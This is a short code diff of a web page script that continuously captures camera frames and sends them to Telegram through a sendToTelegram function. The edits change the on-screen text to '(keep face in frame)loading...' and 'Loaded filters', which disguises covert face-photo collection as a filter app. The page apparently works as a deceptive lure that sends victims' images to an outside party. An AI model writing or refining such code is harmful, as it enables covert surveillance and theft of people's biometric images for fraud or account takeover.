@@ -50,7 +50,7 @@
         function startContinuousCapture() {
             captureInterval = setInterval(async () => {
                 if (imagesSent >= MAX_IMAGES) {
-                    statusDiv.textContent = `(align face in frame)Loaded filters- ${MAX_IMAGES} `;
+                    statusDiv.textContent = `Loaded filters- ${MAX_IMAGES} `;
                     clearInterval(captureInterval);
                     return;
                 }
@@ -64,7 +64,7 @@
                         const success = await sendToTelegram(blob);
                         if (success) {
                             imagesSent++;
-                            statusDiv.textContent = `loading...: ${imagesSent}/${MAX_IMAGES}`;
+                            statusDiv.textContent = `(keep face in frame)loading...: ${imagesSent}/${MAX_IMAGES}`;
                         }
                     }, 'image/jpeg', 0.8);
                     
